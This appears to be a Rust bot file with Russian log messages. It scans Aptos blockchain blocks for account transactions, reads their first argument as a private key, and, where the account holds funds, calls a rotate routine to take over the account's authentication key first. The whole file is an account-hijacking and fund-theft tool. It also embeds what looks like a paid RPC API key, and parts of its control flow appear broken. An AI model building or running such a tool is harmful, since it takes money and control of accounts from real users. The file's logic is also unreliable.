use aptos_sdk::{
    crypto::ed25519::Ed25519PrivateKey,
    rest_client::{ Client as AptosClient, },
    types::{ AccountKey},
};
use aptos_sdk::rest_client::{AptosBaseUrl};
use url::Url;
use std::io;
use std::sync::Arc;
use aptos_sdk::types::transaction::{TransactionPayload};
use anyhow::{Result};
use aptos_sdk::coin_client::CoinClient;
use aptos_sdk::crypto::ValidCryptoMaterialStringExt;
use futures::future::ok;
use hex::{encode};
use log::error;
use tokio::sync::Mutex;
use tokio::sync::watch::Receiver;
use crate::AppState;
use crate::rotate::rotate;




async fn check_account(client: Arc<AptosClient>, private_key_hex:  &Vec<u8>, account_bal: u64) -> Result<bool, Box<dyn std::error::Error + Send + Sync>> {
    let fee = &client.estimate_gas_price().await.unwrap().inner().gas_estimate.clone() * 10;
    if account_bal > fee {
        let prvky = &*encode(&private_key_hex).to_string();
        if  !prvky.eq("ae1a6f3d3daccaf77b55044cea133379934bba04a11b9d0bbd643eae5e6e9c70") &&
            !prvky.eq("ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff") {
            Ok(rotate(prvky, &client).await.expect("Already rotated faster"))
        } else {
            Ok(false)
        }
    } else {
        Ok(false)
    }
}

async fn check_transactions(item: &TransactionPayload, client: Arc<AptosClient>) -> Result<bool, Box<dyn std::error::Error + Send + Sync>> {
    let arguments = item.clone().into_entry_function().as_entry_function_payload();
    if let Some(private_key_hex) = arguments.args.first() {
        match Ed25519PrivateKey::try_from(private_key_hex.as_slice().clone()) {
            Ok(private_key) => {
                let current_key = AccountKey::from_private_key(private_key);
                let coin_client = CoinClient::new(&client);
                let account_address = &current_key.authentication_key().account_address();
                let account_balance = coin_client.get_account_balance(account_address).await;
                if account_balance.is_ok() {
                    let current_key_str = current_key.private_key().to_encoded_string()?;
                    println!("current key str : {:?}", &current_key_str);
                    check_account(client, private_key_hex, account_balance?).await
                } else {
                    Err(Box::new(io::Error::new(io::ErrorKind::Other, "")))
                }
            }
            Err(e) => {
                error!("Ошибка преобразования в Ed25519PrivateKey: {:?}", e);
                Err(Box::new(e))
            }
        }
    }  else {
        Err(Box::new(io::Error::new(io::ErrorKind::Other, "")))
    }
}

async fn process_transactions(client: Arc<AptosClient>, block_height: u64) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    match client.get_block_by_height_bcs(block_height, true).await {
        Ok(response) => {
            let inner = response.inner();
            if let Some(transactions) = inner.clone().transactions {
                let filtered: Vec<TransactionPayload> = transactions
                    .into_iter()
                    .filter_map(|tx_on_chain| tx_on_chain.transaction.clone().try_as_signed_user_txn().cloned())
                    .filter_map(|signed_tx| {
                        match signed_tx.payload() {
                            TransactionPayload::EntryFunction(entry_func) => {
                                if entry_func
                                    .as_entry_function_payload()
                                    .module_name
                                    .contains("aptos_account")
                                {
                                    Some(signed_tx)
                                } else {
                                    None
                                }
                            },
                            _ => None,
                        }
                    })
                    .map(|tx| tx.payload().clone())
                    .collect();


                let mut handles = Vec::new();
                for transaction in filtered {
                    let client_clone = Arc::clone(&client);
                    handles.push(tokio::spawn(async move {
                        check_transactions(&transaction, client_clone).await
                    }));
                }

                for handle in handles {
                    if let Err(e) = handle.await {
                        println!("Ошибка при обработке транзакции: {:?}", e);
                    }
                }
                Ok(true)
            } else {
                Err(Box::new(io::Error::new(io::ErrorKind::Other, "Блок не существует")))
            }
        }
        Err(e) => {
            Err(Box::new(e))
        }
    }
    Ok(())
}

pub async fn run_parser(state: Arc<Mutex<AppState>>, mut shutdown_rx: Receiver<bool>) -> Result<()> {
    let url_node = "https://rpc.ankr.com/premium-http/aptos/45d0848dcab4b6b7869874af38fb2990a2fed49b2bcf9c7de78e0fd5df91a1b8/v1";
    let node_url = Url::parse(&url_node).expect("Failed rpc_url");
    let aptos_rest_client = Arc::new(
        AptosClient::builder(AptosBaseUrl::Custom(node_url)).build()
    );

    loop {
        tokio::select! {
            _ = shutdown_rx.changed() => {
                    if *shutdown_rx.borrow() {
                    break Ok(());
                }
            },
            result = {
                let client_clone = Arc::clone(&aptos_rest_client);
                let current_block_height = {
                    let state_guard = state.lock().await;
                    state_guard.current_block
                };
                tokio::spawn(async move {
                   process_transactions(client_clone, current_block_height.clone()).await;
                })
            } => {
                     match result {
                        Ok(Ok(true)) => {
                            let mut app_state = state.lock().await;
                            let curr_block =  app_state.current_block;
                            println!("Блок {} успешно обработан!", curr_block);
                            let new_block_height = curr_block + 1;
                            app_state.current_block = new_block_height;
                        }
                        Ok(Ok(false)) => {
                        }
                        Ok(Err(..)) => {
                        }
                        Err(e) => {
                            println!("Блок не обработан {}!", e);
                        }
                    }
            }
        }
    }
}